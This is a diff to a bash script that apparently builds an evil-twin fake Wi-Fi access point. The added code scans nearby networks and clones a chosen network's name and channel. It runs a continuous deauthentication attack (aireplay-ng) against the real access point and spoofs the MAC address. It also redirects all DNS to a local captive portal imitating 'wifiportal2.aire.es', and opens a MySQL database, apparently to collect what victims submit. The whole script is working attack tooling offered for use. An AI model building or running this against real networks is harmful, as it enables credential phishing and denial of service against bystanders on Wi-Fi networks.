@@ -1,7 +1,6 @@
 #!/bin/bash
 
-essid="SUPER_SECURE_WIFI"
-canal=1
+tempFolder=fakeap
 
 titulo () {
 	clear
@@ -23,19 +22,15 @@ selectNetworkInterface () {
 
 	if [ $nInterfaces -eq 1 ]
 	then
-		echo
 		echo "[-] Configuring network interface..."
-		echo
 		if [ $nMonInterfaces -eq 0 ]
 		then
                         tempInterface=$(airmon-ng | grep -oiE 'wlan[0-9]')
                         tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                         if [ "$tempStatus" != "enabled" ]
                         then
-				echo
-                                echo "[x] Network interface couldn't be put in monitor mode"
-                                echo
-				ok=0
+			        echo "[x] Network interface couldn't be put in monitor mode"
+                               	ok=0
                         else
 				interface="$tempInterface"mon
 	                        ok=1
@@ -79,9 +74,7 @@ selectNetworkInterface () {
 			tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
 			if [ "$tempStatus" != "enabled" ]
 			then
-				echo
 				echo "[x] Selected network interface couldn't be put in monitor mode"
-				echo
 				ok=0
 			else
 				interface="$tempInterface"mon
@@ -89,18 +82,112 @@ selectNetworkInterface () {
 			fi
 		fi
 	else
-		echo
 		echo "[x] No network interface found"
-		echo
 		ok=0
 	fi
 
 	if [ $ok -eq 1 ]
 	then
-		echo
 		echo "[+] Network interface succesfully configured"
-		echo
 	fi
+}
+
+selectNetworkInterface2 () {
+        nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
+        nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)
+
+        if [ $nInterfaces -eq 2 ]
+        then
+                if [ $nMonInterfaces -eq 1 ]
+                then
+                        tempInterface=$(airmon-ng | grep -oiwE 'wlan[0-9]')
+                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
+                        if [ "$tempStatus" != "enabled" ]
+                        then
+                                echo "[x] Network interface couldn't be put in monitor mode"
+                                ok=0
+                        else
+                                interface2="$tempInterface"mon
+                                ok=1
+                        fi
+                else
+                        interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 1p)
+                        if [ $interface -eq $interface2 ]
+                        then
+                                interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 2p)
+                        fi
+                        ok=1
+                fi
+        else
+                echo "[x] Not enough network interfaces found (2)"
+        fi
+
+        if [ $ok -eq 1 ]
+        then
+                echo "[+] Network interface succesfully configured"
+        fi
+
+}
+
+selectNetwork () {
+        gnome-terminal -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng"
+
+        echo "[-] Press enter to stop scanning networks"
+        read stop
+        pkill airodump-ng
+
+        num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
+        i=1
+        j=1
+        while [ $i -le $num ]
+        do
+                tbssid[$i]=$(grep BSSID  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)
+                tessid[$i]=$(grep essid  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)
+
+                valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)
+
+                while [ "$valid" == "client" ]
+                do
+                        j=$(( $j + 1 ))
+                        valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)
+                done
+                tchannel[$i]=$(grep channel  $tempFolder/temporal-01.kismet.netxml | sed -n "$j"p | cut -d ">" -f 2 | cut -d "<" -f 1)
+
+                if [ -z "${tessid[$i]}" ]
+                then
+                        tessid[$i]="Unknown"
+                fi
+                i=$(( $i + 1 ))
+                j=$(( $j + 1 ))
+        done
+
+        echo "WIFI NETWORKS"
+        echo "Network interface: $interface"
+        echo
+        i=1
+        while [ $i -le $num ]
+        do
+                printf  '%-5s %-2s %-17s %-1s %-2s %-1s %.44s\n'  "[$i]" "->" "${tbssid[$i]}" "|" "${tchannel[$i]}" "|" "${tessid[$i]}"
+                i=$(( $i + 1 ))
+        done
+
+        echo
+        read -p "Select a network > " network
+
+        bssid=${tbssid[$network]}
+        essid=${tessid[$network]}
+        channel=${tchannel[$network]}
+}
+
+deauth(){
+        if [ $ok -eq 1 ]
+        then
+		iwconfig "$interface2" channel "$channel"
+                echo
+                echo "Press enter to deauth"
+                read ola
+                aireplay-ng -0 0 -a "$bssid" $interface2
+        fi
 }
 
 selectNetworkInterface
@@ -109,40 +196,115 @@ then
 
 ################################ PROGRAMS NEEDED ####################################
 
+	echo "[-] Updating packages..."
+	echo
 	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal
+	rm -r $tempFolder
+	mkdir $tempFolder
+	echo
+	echo "[+] All packages updated"
 
 ######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################
 
+	echo "[-] Flushing iptables..."
 	iptables -F
 	iptables -t nat -F
+	echo "[+] Iptables flushed"
 
 ############################# POWER UP WI-FI INTERFACE ###############################
 
-	ifconfig $interfaz down
+	echo "[-] Upgrading network interface..."
+	ifconfig $interface down
 	iw reg set US
+	echo "[+] Network interface upgraded"
 
 ################################ CHANGE MAC ADDRESS ##################################
 
-	macchanger -r $interfaz
-	ifconfig $interfaz up
-	clear
-
-	rm -r /root/fakeap
-	mkdir /root/fakeap
+	echo "[-] Changing MAC address..."
+	echo
+	macchanger -r $interface
+	ifconfig $interface up
+	echo
+	echo "[+] MAC address changed"
 
 ################################# HOSTAPD CONFIG #####################################
 
-	echo "interface=$interfaz
+	op=-1
+        while [ $op -lt 0 ] || [ $op -gt 2 ]
+        do
+                echo
+                echo "Select an option:"
+                echo "[1] -> Create new Wi-Fi acces point"
+                echo "[2] -> Intercept existing access point"
+                read -p "> " op
+		echo
+
+                if [ $op -lt 0 ] || [ $op -gt 2 ]
+                then
+                        echo "[x] Please, select a valid option: "
+                fi
+        done
+
+        if [ $op -eq 1 ]
+        then
+                deauth=0
+                read -p "Wifi essid > " essid
+                read -p "Channel > " channel
+        elif [ $op -eq 2 ]
+        then
+                deauth=1
+                selectNetwork
+        fi
+
+
+        op=-1
+	echo
+        echo "Security: "
+        while [ $op -lt 0 ] || [ $op -gt 2 ]
+        do
+                echo "[1] -> Open"
+                echo "[2] -> WPA2"
+                read -p "> " op
+		echo
+
+                if [ $op -lt 1 ] || [ $op -gt 2 ]
+                then
+                        echo "Please, select a valid option: "
+                fi
+        done
+
+        if [ $op -eq 1 ]
+        then
+
+                echo "interface=$interface
 driver=nl80211
 ssid=$essid
 hw_mode=g
-channel=$canal
+channel=$channel
 macaddr_acl=0
 auth_algs=1
-ignore_broadcast_ssid=0
-" > /root/fakeap/hostapd.conf
+ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
-	gnome-terminal --geometry 118x24+0+0 -e "bash -c \"clear; hostapd /root/fakeap/hostapd.conf; exec bash\"" -q -t "$essid $canal"
+        elif [ $op -eq 2 ]
+        then
+
+        read -p "Wifi password [more than 8 chars]> " pass
+	echo
+
+        echo "interface=$interface
+driver=nl80211
+ssid=$essid
+hw_mode=g
+wpa=2
+wpa_passphrase=$pass
+wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
+channel=$channel
+macaddr_acl=0
+ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
+
+        fi
+
+	gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
 	clear
 
 ########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
@@ -156,13 +318,13 @@ ignore_broadcast_ssid=0
 	if [ $conex -lt 100 ]
 	then
 
-		echo "interface=$interfaz
+		echo "interface=$interface
 dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
 server=8.8.8.8
 log-queries
-listen-address=127.0.0.1" > /root/fakeap/dnsmasq.conf
+listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf
 
 		# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
 
@@ -174,24 +336,24 @@ listen-address=127.0.0.1" > /root/fakeap/dnsmasq.conf
 
 	else
 
-		echo "interface=$interfaz
+		echo "interface=$interface
 dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
 server=8.8.8.8
 log-queries
 listen-address=127.0.0.1
-address=/#/10.0.0.1" > /root/fakeap/dnsmasq.conf
+address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
 
 	fi
-	
+
 	# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
 	# (.htaccess) can reffer directly to the domain name in the URL
-	echo "10.0.0.1 wifiportal2.aire.es" > /root/fakeap/hosts
+	echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts
 
-	ifconfig $interfaz 10.0.0.1
+	ifconfig $interface 10.0.0.1
 
-	gnome-terminal --geometry 118x24+0+1000 -e "bash -c \"clear; dnsmasq -C /root/fakeap/dnsmasq.conf -H /root/fakeap/hosts -d; exec bash\"" -q -t "DHCP"
+	gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"
 
 ################################### WEB FILES #########################################
 
@@ -214,10 +376,22 @@ address=/#/10.0.0.1" > /root/fakeap/dnsmasq.conf
 	service apache2 reload
 	service apache2 restart
 	service mysql start
-	export -f titulo
-	gnome-terminal --geometry 118x48+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
 
-	rm -r /root/fakeap
+	if [ $deauth -eq 1 ]
+        then
+                export -f deauth
+                export -f selectNetworkInterface2
+ 		export bssid=$bssid
+		export channel=$channel
+                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"selectNetworkInterface2; deauth; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
+		export -f titulo
+		gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+	else
+		export -f titulo
+		gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+        fi
+
+	rm -r $tempFolder
 
 	clear
 fi
